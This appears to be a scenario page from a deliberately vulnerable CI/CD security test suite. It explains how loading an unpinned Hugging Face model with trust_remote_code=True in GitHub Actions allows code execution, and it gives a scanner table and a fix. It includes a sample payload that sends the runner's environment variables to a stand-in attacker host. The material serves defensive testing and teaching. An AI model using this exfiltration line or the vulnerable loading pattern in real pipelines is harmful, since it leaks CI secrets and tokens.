# Scenario 122: GitHub Actions — ML model loaded with `trust_remote_code` (code execution)

**Provider:** GitHub Actions · **OWASP:** CICD-SEC-4 (Poisoned Pipeline Execution) · CICD-SEC-3 · **Severity: high**

**Vulnerable workflow:** [`.github/workflows/scenario-122-trust-remote-code.yml`](../../.github/workflows/scenario-122-trust-remote-code.yml)

## The pattern

```yaml
- run: |
    python -c "from transformers import AutoModel; \
      AutoModel.from_pretrained('community/candidate-model', trust_remote_code=True)"
```

`trust_remote_code=True` (or `--trust-remote-code`) tells the
transformers / huggingface_hub loader to **execute the model repo's own Python**
at load time — custom modeling code, tokenizers, configuration classes. An
unpinned or untrusted model repo is therefore arbitrary code execution in CI,
with the job's secrets and `GITHUB_TOKEN` in scope. The ML-supply-chain
analogue of `curl | sh` (scenario 16).

## How an attacker exploits it

The model id is unpinned (`'community/candidate-model'`, no revision). An
attacker who controls — or compromises — that Hub repo pushes a
`modeling_*.py` whose module-level code runs on import:

```python
import os, urllib.request
urllib.request.urlopen("https://attacker.tld/x?" + os.popen("env").read())
```

The next CI run calls `from_pretrained(..., trust_remote_code=True)`, the loader
imports the repo's code, and the payload executes on the runner. Even a pinned
model is only as trustworthy as the org that published it.

## Expected scanner coverage

| Scanner | Detection |
|---------|-----------|
| pipeline-check | `GHA-120` — _ML model loaded with `trust_remote_code` (code execution)_ |
| zizmor / poutine / Checkov / KICS / actionlint / octoscan | reconciled from real SARIF — no scanner here besides pipeline-check ships an ML-loader rule today |

## Fix

Load models with `trust_remote_code=False` (the library default). If a model
genuinely needs custom code, vet it and **pin an exact revision** (a commit SHA,
not a tag or branch), load it in a sandboxed job with no production secrets, and
prefer `safetensors` weights over pickle.

## References

- Hugging Face — `trust_remote_code` security note: https://huggingface.co/docs/transformers/en/model_doc/auto#transformers.AutoModel.from_pretrained.trust_remote_code
- Hugging Face — Pickle / safetensors security: https://huggingface.co/docs/hub/en/security-pickle
